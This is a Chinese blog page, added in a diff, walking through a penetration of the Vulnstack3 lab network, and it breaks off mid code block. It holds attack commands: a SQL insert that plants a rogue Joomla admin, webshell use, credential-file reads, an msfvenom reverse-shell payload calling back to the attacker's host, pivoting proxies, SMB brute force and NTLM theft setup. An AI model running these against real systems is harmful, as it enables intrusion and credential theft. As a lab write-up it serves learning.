@@ -1,0 +1,367 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Vulnstack3靶场内网渗透 | 1ceC0la's blog</title><meta name="keywords" content="渗透测试,内网安全，vulnstack,域渗透"><meta name="author" content="1ceC0la"><meta name="copyright" content="1ceC0la"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="环境搭建需要添加一张192.168.93.0&#x2F;24网段的内网网卡  若是kali用的Nat模式这里不要勾选“将主机虚拟适配器连接到此网络”，若是桥接模式则勾选 拓扑图 打靶先用nmap进行探针nmap 192.168.184.0&#x2F;24 探测到在192.168.184.137地址开有web服务 访问如下，发现是Joomla的CMS  利用msf的auxiliary&#x2F;scanner&#x2F;http&#x2F;joom">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vulnstack3靶场内网渗透">
+<meta property="og:url" content="http://example.com/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/index.html">
+<meta property="og:site_name" content="1ceC0la&#39;s blog">
+<meta property="og:description" content="环境搭建需要添加一张192.168.93.0&#x2F;24网段的内网网卡  若是kali用的Nat模式这里不要勾选“将主机虚拟适配器连接到此网络”，若是桥接模式则勾选 拓扑图 打靶先用nmap进行探针nmap 192.168.184.0&#x2F;24 探测到在192.168.184.137地址开有web服务 访问如下，发现是Joomla的CMS  利用msf的auxiliary&#x2F;scanner&#x2F;http&#x2F;joom">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png">
+<meta property="article:published_time" content="2022-07-10T03:47:00.000Z">
+<meta property="article:modified_time" content="2022-07-10T03:47:00.000Z">
+<meta property="article:author" content="1ceC0la">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="内网安全，vulnstack">
+<meta property="article:tag" content="域渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png"><link rel="shortcut icon" href="/img/avatar.gif"><link rel="canonical" href="http://example.com/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Vulnstack3靶场内网渗透',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-07-10 11:47:00'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const fontSizeVal = saveToLocal.get('global-font-size')
+    if (fontSizeVal !== undefined) {
+      document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
+    }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.0.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.gif" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">33</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">28</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-heartbeat"></i><span> 娱乐</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 图库</span></a></li><li><a class="site-page child" href="/%E9%82%A3%E4%BA%9B%E5%B9%B4-%E6%88%91%E7%9C%8B%E8%BF%87%E7%9A%84%E7%94%B5%E5%BD%B1/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About me</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">1ceC0la's blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-heartbeat"></i><span> 娱乐</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 图库</span></a></li><li><a class="site-page child" href="/%E9%82%A3%E4%BA%9B%E5%B9%B4-%E6%88%91%E7%9C%8B%E8%BF%87%E7%9A%84%E7%94%B5%E5%BD%B1/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About me</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Vulnstack3靶场内网渗透</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-07-10T03:47:00.000Z" title="发表于 2022-07-10 11:47:00">2022-07-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-07-10T03:47:00.000Z" title="更新于 2022-07-10 11:47:00">2022-07-10</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">内网安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>13分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Vulnstack3靶场内网渗透"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>需要添加一张192.168.93.0/24网段的内网网卡</p>
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715230940156.png" alt="image-20220715230940156"></p>
+<p>若是kali用的Nat模式这里不要勾选“将主机虚拟适配器连接到此网络”，若是桥接模式则勾选</p>
+<h2 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h2><p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715231439922.png" alt="image-20220715231439922"></p>
+<h2 id="打靶"><a href="#打靶" class="headerlink" title="打靶"></a>打靶</h2><p>先用nmap进行探针<code>nmap 192.168.184.0/24</code></p>
+<p>探测到在192.168.184.137地址开有web服务</p>
+<p>访问如下，发现是Joomla的CMS</p>
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220710114851003.png" alt="image-20220710114851003"></p>
+<p>利用msf的<code>auxiliary/scanner/http/joomla_version</code>模块探测Joomla版本，发现是3.9.12版本的</p>
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220710115045397.png" alt="image-20220710115045397"></p>
+<p>这就有点棘手了，因为版本很新，网上都是3.4、3.5之类的漏洞，看来是没法直接用，于是去找登录点看看有没有弱口令</p>
+<p>有两处登录点，一个是前台<code>http://192.168.184.137/index.php/author-login</code></p>
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220710115400615.png" alt="image-20220710115400615"></p>
+<p>另一个是后台<code>http://192.168.184.137/administrator/index.php</code>（robots.txt中找到的路径）</p>
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220710115413169.png" alt="image-20220710115413169"></p>
+<p>但是都不存在弱口令，呜呜😭</p>
+<p>没辙了等着爆破密码，摆烂了一会儿</p>
+<p>这个靶场是和小伙伴一起打的，在我摆烂的时候，小伙伴用dirsearch扫了一下目录，扫出来了一个<code>configuration.php~</code>文件，里面有mysql数据库用户名和密码<code>testuser/cvcvgjASD!@</code>，我直呼牛B！！（害，懒了一下没去扫目录，不能懒啊！）</p>
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220710120843966.png" alt="image-20220710120843966"></p>
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220710120915806.png" alt="image-20220710120915806"></p>
+<p>直接用Navicat登录成功，查看<code>umnbt_users</code>表，获得用户名密码<code>admin/$10$N/Yv/9rzxyq.z0gLTT5og.pj3FFAP8Sq2PcBgsMX/Qnc2671qQkHy</code></p>
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220710121138968.png" alt="image-20220710121138968"></p>
+<p>这里密码加了密，没办法直接用，去somd5也没有解出来，提示此密文无法识别，真·脑阔疼，又无从下手了</p>
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220710121340132.png" alt="image-20220710121340132"></p>
+<p>这里我想用mysql直接写shell，但是查了文章说需要root权限，完了没辙了，开摆！</p>
+<p>这里实在是不会，就去看了一眼攻略，可以自行添加用户进行登录</p>
+<p><a target="_blank" rel="noopener" href="https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn">https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn</a></p>
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220710203030913.png" alt="image-20220710203030913"></p>
+<p>所以这里payload如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO `am2zu_users` (`name`, `username`, `password`, `params`, `registerDate`, `lastvisitDate`, `lastResetTime`)</span><br><span class="line">VALUES (&#x27;Administrator2&#x27;, &#x27;admin2&#x27;, &#x27;d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199&#x27;, &#x27;&#x27;, NOW(), NOW(), NOW());</span><br><span class="line"></span><br><span class="line">INSERT INTO `am2zu_user_usergroup_map` (`user_id`,`group_id`)</span><br><span class="line">VALUES (LAST_INSERT_ID(),&#x27;8&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>这里有个小坑，我之前找的_users表没找对，<code>umnbt_users</code>不是后台登录的校验表，<code>am2zu_users</code>才是，我之间对着umnbt_users表一顿输出，一直登陆不上，后来才发现表弄错了，真的是烦！</p>
+<p>然后终于用admin2/secret登录上了后台</p>
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220710203534264.png" alt="image-20220710203534264"></p>
+<p>用冰蝎连shell发现disable_fuction把命令执行函数都给禁用了，然后采用哥斯拉的bypass命令执行成功</p>
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220710213724093.png" alt="image-20220710213724093"></p>
+<p>接下来可以利用如下命令做信息收集</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">uname -a    # 获取所有版本信息</span><br><span class="line">uname -m    # 获取Linux内核架构</span><br><span class="line">cat /proc/version    # 获取内核信息 </span><br><span class="line">cat /etc/*-release   # 发布信息</span><br><span class="line">cat /etc/issue    # 发布信息</span><br><span class="line">hostname    # 获取主机名</span><br><span class="line"></span><br><span class="line">cat /etc/passwd    # 列出系统所有用户 </span><br><span class="line">cat /etc/group    # 列出系统所有组 </span><br><span class="line">w    # 查看目前登录的用户</span><br><span class="line">whoami    # 查看当前用户 </span><br><span class="line">id    # 查看当前用户信息 </span><br><span class="line">sudo -l    # 列出目前用户可执行与无法执行的指令 </span><br><span class="line"></span><br><span class="line">ps <span class="built_in">aux</span>    # 查看进程信息 </span><br><span class="line">ls -la /etc/cron*    # 查看计划任务</span><br><span class="line">ifconfig -a    # 列出网络接口信息 </span><br><span class="line">cat /etc/network/interfaces    # 列出网络接口信息 </span><br><span class="line">arp -a    # 查看系统arp表 </span><br><span class="line">route    # 打印路由信息</span><br><span class="line">netstat -anplt    # 打印本地端口开放信息 </span><br><span class="line">iptables -L    # 列出iptable的配置规则</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里遇到一个奇怪的地方，当执行ifconfig查看网卡的时候没有之前192.168.184.137这个ip，出现了一个没见过的ip地址192.168.93.120，但我并没有93这个网段的网卡应该是到不了的</p>
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220711174311528.png" alt="image-20220711174311528"></p>
+<p>这里着实不理解，就去网上看wp了</p>
+<p>原来，之前的184.137这台主机并不是真正的web服务器，93.100这台才是，这里是93.100这台web服务器利用184.137这台服务器做了反向代理，在后续渗透查看配置文件的时候也能证明。</p>
+<p>网上查找资料说这样做反向代理的目的可以<strong>隐藏服务端真实ip</strong>，另外还说<strong>反向代理可以实现负载均衡</strong></p>
+<p>之后根据wp的提示在/tmp/mysql/test.txt中发现了一组用户名密码：wwwuser/wwwuser_123Aqx，猜测应该就是192.168.184.137这台主机ssh的用户和密码。</p>
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220711204558737.png" alt="image-20220711204558737"></p>
+<p>尝试ssh登录成功，ifconfig查看网卡有192.168.184.137和192.168.93.100这两个ip</p>
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220711180345893.png" alt="image-20220711180345893"></p>
+<p>并且在/etc/nginx/nginx.conf文件中查到如下信息，也证明了之前的说法（93.100这台web服务器利用184.137这台服务器做了反向代理）</p>
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220711204938381.png" alt="image-20220711204938381"></p>
+<p>接下来就是搭代理打内网，看网上文章都在用脏牛提权，我感觉没必要提权也能打内网</p>
+<p>这里ew，ssh代理都可以，我选择简单的ssh动态代理<code>ssh -CfNg -D 1080 wwwuser@192.168.184.137</code>，结合proxifier对内网进行渗透</p>
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220711230354697.png" alt="image-20220711230354697"></p>
+<p>这里可以直接访问到内网地址说明代理成功</p>
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220711230526240.png" alt="image-20220711230526240"></p>
+<p>接下来就用fscan进行扫描<code>fscan64.exe -h 192.168.93.1/24 -np -o fscan_result/result93.txt</code>（-np需要加上，因为直接ping不通），发现内网还有10、20、30这三台主机</p>
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220711234256330.png" alt="image-20220711234256330"></p>
+<p>再用nmap进行更全面的端口扫描</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sT -sV <span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">10</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">20</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">30</span> -F</span><br><span class="line">-Pn # 扫描之前不需要用<span class="built_in">ping</span>命令，有些防火墙禁止<span class="built_in">ping</span>命令。可以使用此选项进行扫描</span><br><span class="line">-sT # TCP connect（）扫描，这种方式会在目标主机的日志中记录大批连接请求和错误信息。</span><br><span class="line">-sV # 探测端口服务版本</span><br><span class="line">-F # 只扫描在nmap内建的服务文件中已知的端口，如果不致电给，nmap将扫描端口<span class="number">1</span>~<span class="number">1024</span>及包含在nmap-service文件中的所有其他端口</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220711235001116.png" alt="image-20220711235001116"></p>
+<p>发现存在域<code>test.org</code>，域控为93.10这台服务器，那么接下来的目标就是拿下域控了</p>
+<p>进一步的渗透测试交到MSF上进行</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 利用msf生成一个木马，上传到<span class="number">184</span>.<span class="number">137</span>上执行</span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<span class="number">192</span>.<span class="number">168</span>.<span class="number">184</span>.<span class="number">128</span> LPORT=<span class="number">4444</span> -f elf &gt; shell.elf</span><br><span class="line"></span><br><span class="line"># 在msf上开启监听</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span></span><br><span class="line"><span class="built_in">set</span> lport <span class="number">4444</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220713134118908.png" alt="image-20220713134118908"></p>
+<p>添加路由如下</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 添加路由</span><br><span class="line">run autoroute -s <span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">0</span>/<span class="number">24</span></span><br><span class="line"># 查看路由</span><br><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220713134631085.png" alt="image-20220713134631085"></p>
+<p>添加成功后，利用msf在本地开启socks代理</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> SRVHOST <span class="number">192</span>.<span class="number">168</span>.<span class="number">184</span>.<span class="number">128</span></span><br><span class="line"><span class="built_in">set</span> SRVPORT <span class="number">1080</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>代理开好后配置/etc/proxychains4.conf文件方便后续使用proxychans4</p>
+<p>后面都是参考wp的了，结果还没搞出来，可能是环境问题，只能强行写一下了，记录一下</p>
+<blockquote>
+<p>有几个打法：<strong>SMB爆破</strong>、<strong>MSSQL NTLM Stealer</strong>、<strong>NTLM Relay</strong>。</p>
+</blockquote>
+<h4 id="SMB爆破"><a href="#SMB爆破" class="headerlink" title="SMB爆破"></a>SMB爆破</h4><p>这里是直接根据wp在字典里加的密码，QAQ</p>
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715195130401.png" alt="image-20220715195130401"></p>
+<h4 id="MSSQL-NTLM-Stealer"><a href="#MSSQL-NTLM-Stealer" class="headerlink" title="MSSQL NTLM Stealer"></a>MSSQL NTLM Stealer</h4><p>前面探测到<code>192.168.93.20</code>这台机开启了<code>1433</code>端口，尝试进行连接。账号密码则使用前面<code>Joomla CMS</code>那个配置文件中收集到的：<code>testuser / cvcvgjASD!@</code></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install freetds-bin</span><br><span class="line">proxychains4 tsql -S <span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">20</span> -U testuser</span><br></pre></td></tr></table></figure>
+
+<p>可以登录</p>
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715194331486.png" alt="image-20220715194331486"></p>
+<p>接下来就是在93.100这台服务器上搭建Responder环境</p>
+<p>首先下载下面几个工具，</p>
+<p>OpenSSL: <a target="_blank" rel="noopener" href="https://www.openssl.org/source/openssl-1.1.1g.tar.gz">https://www.openssl.org/source/openssl-1.1.1g.tar.gz</a></p>
+<p>Python3: <a target="_blank" rel="noopener" href="https://www.python.org/ftp/python/3.6.9/Python-3.6.9.tgz">https://www.python.org/ftp/python/3.6.9/Python-3.6.9.tgz</a></p>
+<p>Responder: <a target="_blank" rel="noopener" href="https://github.com/lgandx/Responder">https://github.com/lgandx/Responder</a></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"># 安装如下</span><br><span class="line"># 